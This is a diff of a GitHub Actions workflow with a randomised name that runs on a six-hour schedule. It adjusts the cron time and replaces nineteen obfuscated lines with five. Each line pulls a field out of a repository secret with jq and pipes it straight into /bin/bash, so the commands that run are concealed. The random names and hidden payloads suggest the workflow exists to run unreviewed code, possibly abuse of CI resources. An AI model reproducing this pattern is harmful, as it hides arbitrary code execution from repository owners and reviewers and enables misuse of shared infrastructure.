@@ -2,8 +2,7 @@ name: guzhengqiu3817
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 5/6 * * *'
-
+    - cron: '43 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,25 +10,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: guzhengqiu3817
         env:
-          x9764: ${{ secrets.x9764 }}
+          sspst745: ${{ secrets.sspst745 }}
         run: |
-          echo $x9764 | jq -r .tve3 | /bin/bash
-          echo $wh5 | jq -r .u16 | /bin/bash
-          echo $qpxl4 | jq -r .aa83287 | /bin/bash
-          echo $i7 | jq -r .czi00 | /bin/bash
-          echo $ohayd520 | jq -r .o15 | /bin/bash
-          echo $t51 | jq -r .vjyh8051 | /bin/bash
-          echo $ph72 | jq -r .ssjim1 | /bin/bash
-          echo $zbeds3 | jq -r .t2171 | /bin/bash
-          echo $e7 | jq -r .knd79123 | /bin/bash
-          echo $jnr0212 | jq -r .gihd79 | /bin/bash
-          echo $h95326 | jq -r .ju7 | /bin/bash
-          echo $cd6677 | jq -r .zdzn879 | /bin/bash
-          echo $jh35 | jq -r .gbh6372 | /bin/bash
-          echo $qle10563 | jq -r .roeaf7030 | /bin/bash
-          echo $ndwfg622 | jq -r .ez45 | /bin/bash
-          echo $aj0 | jq -r .nj5115 | /bin/bash
-          echo $eycw7332 | jq -r .qm8986 | /bin/bash
-          echo $gehae97522 | jq -r .c2708 | /bin/bash
-          echo $uxd3902 | jq -r .rgi6514 | /bin/bash
+          echo $sspst745 | jq -r .s8 | /bin/bash
+          echo $gf74457 | jq -r .tngq266 | /bin/bash
+          echo $ozd648 | jq -r .wf4933 | /bin/bash
+          echo $qkoh0153 | jq -r .nl649 | /bin/bash
+          echo $xmny6 | jq -r .nhkz180 | /bin/bash
 
